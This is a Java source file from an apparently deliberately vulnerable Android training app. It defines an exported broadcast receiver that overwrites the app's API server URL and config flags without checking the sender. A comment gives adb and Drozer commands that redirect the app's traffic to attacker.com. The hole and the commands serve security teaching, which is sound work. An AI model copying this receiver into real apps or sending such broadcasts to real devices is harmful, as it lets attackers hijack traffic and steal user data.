package com.vulnlab.insecureapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;

/**
 * VULNERABILITY 11.5 — Broadcast Receiver Attack
 *
 * This exported BroadcastReceiver updates the app's API server URL
 * from the broadcast extras with NO sender verification.
 *
 * An attacker can redirect all network traffic to their server:
 *
 * Test:
 *   adb shell am broadcast \
 *       -a com.vulnlab.insecureapp.ACTION_UPDATE_CONFIG \
 *       --es server_url http://attacker.com \
 *       --ez force_update true
 *
 * After sending this broadcast, all API calls in the app go to attacker.com.
 *
 * Drozer:
 *   dz> run app.broadcast.send \
 *           --component com.vulnlab.insecureapp com.vulnlab.insecureapp.ConfigReceiver \
 *           --extra string server_url http://attacker.com
 */
public class ConfigReceiver extends BroadcastReceiver {

    private static final String TAG = "VulnLab:ConfigReceiver";
    static final String PREFS_NAME = "vulnlab_prefs";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "ACTION_UPDATE_CONFIG received");

        // VULNERABLE: no sender authentication, no permission check
        String newServerUrl = intent.getStringExtra("server_url");
        boolean forceUpdate = intent.getBooleanExtra("force_update", false);
        String newFeatureFlag = intent.getStringExtra("feature_flag");

        SharedPreferences.Editor editor = context
                .getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit();

        if (newServerUrl != null) {
            Log.w(TAG, "API server URL changed to: " + newServerUrl);
            editor.putString("api_server_url", newServerUrl);
        }

        if (newFeatureFlag != null) {
            editor.putString("feature_flag", newFeatureFlag);
            Log.w(TAG, "Feature flag updated: " + newFeatureFlag);
        }

        if (forceUpdate) {
            Log.w(TAG, "Force update triggered by broadcast");
            editor.putBoolean("force_update_pending", true);
        }

        editor.apply();
        Log.d(TAG, "Config updated from broadcast");
    }
}
